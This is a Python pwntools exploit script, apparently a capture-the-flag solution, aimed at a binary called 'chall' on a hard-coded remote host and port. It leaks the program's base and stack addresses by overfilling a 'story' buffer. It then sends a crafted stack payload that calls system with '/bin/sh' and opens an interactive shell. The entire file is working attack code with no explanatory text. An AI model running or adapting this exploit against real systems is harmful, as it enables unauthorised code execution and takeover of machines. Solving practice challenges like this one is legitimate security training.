#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '20.195.43.216', 8001

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

# write
# breakrva 0x15aa

# return
breakrva 0x15e2

# posix spawn
breakrva 0x1ad2 
breakrva 0x19cc
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def story(size, data):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b':', str(size).encode())
    io.sendafter(b':', data)

def exploit():
    global io
    io = initialize()

    story(0x320, b'A'*(0x80-1)+b'B')
    
    io.recvuntil(b'AB')
    elf.address = u32(io.recv(4)) - 0x110e0
    io.recv(4)
    stack = u32(io.recv(4))

    rop = ROP(elf)

    payload = flat({
        172: [
            stack+0x48+4,
            0x0,
            0x0,
            stack,
            elf.sym['system'],
            next(elf.search(b'/bin/sh\x00')),
            next(elf.search(b'/bin/sh\x00'))
            # 0x0,
        ]
    })

    story(0x400, payload)
    io.sendlineafter(b'>', b'3')
    
    log.info('elf base: %#x', elf.address)
    log.info('stack: %#x', stack)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
